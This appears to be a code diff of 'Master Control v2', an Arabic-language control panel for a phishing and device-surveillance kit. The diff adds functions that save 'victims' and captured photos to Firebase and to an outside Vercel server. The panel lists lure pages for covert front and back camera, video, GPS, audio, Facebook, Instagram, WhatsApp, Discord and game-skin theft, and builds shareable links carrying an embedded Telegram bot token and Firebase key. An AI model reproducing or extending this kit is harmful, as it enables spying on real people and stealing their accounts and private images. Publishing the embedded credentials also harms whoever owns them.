@@ -10,49 +10,63 @@
         :root { --red: #ff0040; --gold: #ffaa00; --green: #00ff41; --dark: #0a0a0a; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; }
-        .nav { display:flex; gap:6px; margin-bottom:16px; flex-wrap:wrap; }
-        .nav-btn { flex:1; min-width:60px; padding:10px 6px; background:var(--dark); border:1px solid #333; color:#fff; border-radius:8px; cursor:pointer; font-family:'Courier New',monospace; font-size:10px; text-align:center; }
-        .nav-btn.active { border-color:var(--red); color:var(--red); box-shadow:0 0 15px rgba(255,0,64,0.3); }
+        
+        .header { text-align:center; margin-bottom:16px; }
+        .skull { font-size:50px; animation:pulse 1s infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.1)} }
+        h1 { color:var(--red); font-size:20px; text-shadow:0 0 20px var(--red); }
+        
+        .nav { display:flex; gap:4px; margin-bottom:16px; flex-wrap:wrap; }
+        .nav-btn { flex:1; min-width:55px; padding:10px 4px; background:var(--dark); border:1px solid #333; color:#fff; border-radius:8px; cursor:pointer; font-family:'Courier New',monospace; font-size:10px; text-align:center; }
+        .nav-btn.active { border-color:var(--red); color:var(--red); }
         
         .page { display:none; }
         .page.active { display:block; }
         
         .card { background:var(--dark); border:1px solid #333; border-radius:12px; padding:16px; margin-bottom:12px; }
-        .card h2 { color:var(--gold); font-size:14px; margin-bottom:12px; }
+        .card h2 { color:var(--gold); font-size:14px; margin-bottom:12px; border-bottom:1px solid #333; padding-bottom:8px; }
         
-        .log-item { background:#050000; border:1px solid #333; border-radius:8px; padding:12px; margin-bottom:8px; }
+        .log-item { background:#050000; border:1px solid #333; border-radius:8px; padding:12px; margin-bottom:6px; }
         .log-item .time { color:#666; font-size:10px; }
         .log-item .service { color:var(--red); font-size:12px; font-weight:bold; }
         .log-item .data { color:#aaa; font-size:11px; margin-top:4px; }
         
-        .gallery-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; }
+        .gallery-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; }
         .gallery-item { aspect-ratio:1; border-radius:8px; overflow:hidden; border:1px solid #333; cursor:pointer; background:#111; }
         .gallery-item img { width:100%; height:100%; object-fit:cover; }
         
         .stats-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-bottom:16px; }
-        .stat-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:12px; text-align:center; }
-        .stat-card .num { color:var(--red); font-size:22px; font-weight:bold; }
+        .stat-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:14px; text-align:center; }
+        .stat-card .num { color:var(--red); font-size:26px; font-weight:bold; }
         .stat-card .txt { color:#666; font-size:10px; margin-top:4px; }
         
-        .btn { padding:10px 16px; border-radius:6px; border:none; cursor:pointer; font-family:'Courier New',monospace; font-weight:bold; font-size:12px; }
-        .btn-red { background:#2a0a0a; color:var(--red); border:1px solid var(--red); }
-        
         .tool-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
-        .tool-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:14px; text-align:center; cursor:pointer; font-size:11px; }
-        .tool-card:active { border-color:var(--red); }
-        .tool-card .icon { font-size:28px; display:block; margin-bottom:6px; }
+        .tool-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:14px; text-align:center; cursor:pointer; font-size:11px; transition:all 0.2s; }
+        .tool-card:active { border-color:var(--red); transform:scale(0.95); }
+        .tool-card .icon { font-size:30px; display:block; margin-bottom:6px; }
+        .tool-card .name { color:#ccc; }
         
         .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:999; justify-content:center; align-items:center; padding:20px; }
         .modal.show { display:flex; }
         .modal img { max-width:95%; max-height:85vh; border-radius:10px; }
-        .modal .close { position:absolute; top:20px; right:20px; color:#fff; font-size:30px; cursor:pointer; }
+        .modal .close { position:absolute; top:20px; right:20px; color:#fff; font-size:30px; cursor:pointer; background:rgba(255,0,0,0.5); width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; }
         
         .empty { text-align:center; color:#666; padding:30px; font-size:13px; }
-        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
-        .live-dot { display:inline-block; width:8px; height:8px; background:var(--green); border-radius:50%; animation:pulse 1s infinite; margin-left:4px; }
+        .server-status { text-align:center; font-size:10px; margin-bottom:8px; }
+        .server-status.online { color:var(--green); }
+        .server-status.offline { color:var(--red); }
+        
+        @keyframes pulse2 { 0%,100%{opacity:1} 50%{opacity:0.4} }
+        .live-dot { display:inline-block; width:8px; height:8px; background:var(--green); border-radius:50%; animation:pulse2 1s infinite; margin-left:4px; }
     </style>
 </head>
 <body>
+
+<div class="header">
+    <div class="skull">💀</div>
+    <h1>Master Control v2</h1>
+    <div class="server-status" id="serverStatus">🔄 جاري الاتصال بالسيرفر...</div>
+</div>
 
 <div class="nav">
     <button class="nav-btn active" onclick="showTab('dashboard')">📊 لوحة</button>
@@ -105,7 +119,9 @@ var BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
 var CHAT_ID = '7276604783';
 var BASE = 'https://ai-proxy-eosin.vercel.app';
 var BASE2 = 'https://pubgskin.vercel.app';
+var API_URL = 'https://pubgskin.vercel.app/api/save';
 
+// Firebase
 firebase.initializeApp({
     apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
     projectId: "game-a1aca",
@@ -113,6 +129,69 @@ firebase.initializeApp({
     appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
 });
 db = firebase.firestore();
+
+// Check server
+fetch(API_URL)
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        document.getElementById('serverStatus').textContent = '✅ السيرفر شغال | ' + d.timestamp;
+        document.getElementById('serverStatus').className = 'server-status online';
+    })
+    .catch(function() {
+        document.getElementById('serverStatus').textContent = '⚠️ السيرفر غير متصل - استخدام Firebase مباشر';
+        document.getElementById('serverStatus').className = 'server-status offline';
+    });
+
+// Save to server
+async function saveToServer(type, data) {
+    try {
+        await fetch(API_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
+    } catch(e) {}
+}
+
+// Save victim to Firebase + Server
+async function saveVictim(service, data, device) {
+    var timestamp = new Date().toISOString();
+    var payload = {
+        type: 'victim',
+        service: service,
+        data: data,
+        device: device || navigator.userAgent,
+        timestamp: timestamp
+    };
+    
+    // Save to Firebase
+    try {
+        await db.collection('victims').add(payload);
+    } catch(e) {}
+    
+    // Save to server
+    saveToServer('victim', payload);
+}
+
+// Save photo to Firebase + Server
+async function savePhoto(url, service, device) {
+    var timestamp = new Date().toISOString();
+    var payload = {
+        type: 'photo',
+        imageUrl: url,
+        service: service || 'صورة',
+        device: device || navigator.userAgent,
+        timestamp: timestamp
+    };
+    
+    // Save to Firebase
+    try {
+        await db.collection('gallery').add(payload);
+    } catch(e) {}
+    
+    // Save to server
+    saveToServer('photo', payload);
+}
 
 function showTab(tab) {
     document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
@@ -157,7 +236,7 @@ async function loadDashboard() {
         document.getElementById('stat-today').textContent = todayCount;
         document.getElementById('recent-logs').innerHTML = html || '<div class="empty">لا توجد سجلات بعد</div>';
     } catch(e) {
-        document.getElementById('recent-logs').innerHTML = '<div class="empty">❌ فشل التحميل: ' + e.message + '</div>';
+        document.getElementById('recent-logs').innerHTML = '<div class="empty">❌ فشل التحميل</div>';
     }
 }
 
@@ -185,9 +264,10 @@ async function loadGallery() {
         var html = '';
         snap.forEach(function(doc) {
             var d = doc.data();
-            if (d.url) {
-                html += '<div class="gallery-item" onclick="openModal(\'' + d.url + '\')">';
-                html += '<img src="' + d.url + '" alt="" loading="lazy">';
+            if (d.url || d.imageUrl) {
+                var imgUrl = d.url || d.imageUrl;
+                html += '<div class="gallery-item" onclick="openModal(\'' + imgUrl + '\')">';
+                html += '<img src="' + imgUrl + '" alt="" loading="lazy">';
                 html += '</div>';
             }
         });
@@ -199,39 +279,35 @@ async function loadGallery() {
 
 function loadTools() {
     var tools = [
-        {page:'photo-front.html',name:'كاميرا أمامية',icon:'📸'},
-        {page:'photo-back.html',name:'كاميرا خلفية',icon:'📷'},
-        {page:'mm.html',name:'فيديو أمامي',icon:'🎥'},
-        {page:'video-back.html',name:'فيديو خلفي',icon:'📹'},
-        {page:'location.html',name:'GPS',icon:'📍'},
-        {page:'audio.html',name:'صوت',icon:'🎙️'},
-        {page:'fb.html',name:'فيسبوك',icon:'📘'},
-        {page:'insta.html',name:'انستجرام',icon:'📷'},
-        {page:'whatsapp.html',name:'واتساب',icon:'💬'},
-        {page:'scan.html',name:'رفع صور',icon:'📁'},
-        {page:'live.html',name:'بث مباشر',icon:'🎥'},
-        {page:'g.html',name:'PUBG',icon:'🔫'},
-        {page:'freefire.html',name:'فري فاير',icon:'🎯'}
+        {page:'photo-front.html',name:'كاميرا أمامية',icon:'📸',base:BASE},
+        {page:'photo-back.html',name:'كاميرا خلفية',icon:'📷',base:BASE},
+        {page:'mm.html',name:'فيديو أمامي',icon:'🎥',base:BASE},
+        {page:'video-back.html',name:'فيديو خلفي',icon:'📹',base:BASE},
+        {page:'location.html',name:'GPS',icon:'📍',base:BASE},
+        {page:'audio.html',name:'صوت',icon:'🎙️',base:BASE},
+        {page:'fb.html',name:'فيسبوك',icon:'📘',base:BASE},
+        {page:'insta.html',name:'انستجرام',icon:'📷',base:BASE},
+        {page:'whatsapp.html',name:'واتساب',icon:'💬',base:BASE},
+        {page:'scan.html',name:'رفع صور',icon:'📁',base:BASE2},
+        {page:'live.html',name:'بث مباشر',icon:'🎥',base:BASE2},
+        {page:'g.html',name:'PUBG',icon:'🔫',base:BASE},
+        {page:'freefire.html',name:'فري فاير',icon:'🎯',base:BASE2},
+        {page:'discord.html',name:'ديسكورد',icon:'💎',base:BASE2}
     ];
     
     var html = '';
     tools.forEach(function(t) {
-        html += '<div class="tool-card" onclick="copyLink(\'' + t.page + '\')">';
+        var base = t.base || BASE;
+        html += '<div class="tool-card" onclick="copyLink(\'' + t.page + '\',\'' + base + '\')">';
         html += '<span class="icon">' + t.icon + '</span>';
-        html += t.name;
+        html += '<span class="name">' + t.name + '</span>';
         html += '</div>';
     });
     document.getElementById('tools-grid').innerHTML = html;
 }
 
-function getBase(page) {
-    var mainPages = ['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','fb.html','insta.html','whatsapp.html'];
-    if (mainPages.indexOf(page) !== -1) return BASE;
-    return BASE2;
-}
-
-function copyLink(page) {
-    var link = getBase(page) + '/' + page + '?chatId=' + CHAT_ID + '&token=' + encodeURIComponent(BOT_TOKEN);
+function copyLink(page, base) {
+    var link = base + '/' + page + '?chatId=' + CHAT_ID + '&token=' + encodeURIComponent(BOT_TOKEN);
     if (navigator.clipboard) {
         navigator.clipboard.writeText(link).then(function() {
             alert('✅ تم نسخ الرابط!');
